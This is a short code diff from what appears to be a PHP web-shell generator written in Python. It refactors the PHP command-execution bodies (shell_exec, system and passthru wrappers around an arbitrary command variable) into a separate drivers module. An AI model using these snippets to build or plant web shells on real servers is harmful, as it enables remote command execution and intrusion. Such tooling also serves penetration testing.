@@ -10,15 +10,9 @@ from shellsuite.protocol import contract
 
 from .spec import WebShellSpec
 
-_TEMPLATES = importlib.resources.files("shellshock.creator") / "templates"
+from . import drivers
 
-# PHP body for __ss_run(), per driver. Drivers that echo their output
-# (system, passthru) are captured with output buffering; shell_exec returns it.
-_DRIVER_BODIES: dict[str, str] = {
-    "shell_exec": "return (string) shell_exec($__ss_cmd);",
-    "system": "ob_start(); system($__ss_cmd); return ob_get_clean();",
-    "passthru": "ob_start(); passthru($__ss_cmd); return ob_get_clean();",
-}
+_TEMPLATES = importlib.resources.files("shellshock.creator") / "templates"
 
 
 def _render(text: str, values: dict[str, str]) -> str:
@@ -32,7 +26,7 @@ def _render(text: str, values: dict[str, str]) -> str:
 
 def _context(spec: WebShellSpec) -> dict[str, str]:
     driver = spec.resolved_driver
-    body = _DRIVER_BODIES.get(driver)
+    body = drivers.DRIVER_BODIES.get(driver)
     if body is None:
         raise ValueError(f"driver not implemented: {driver!r}")
     return {
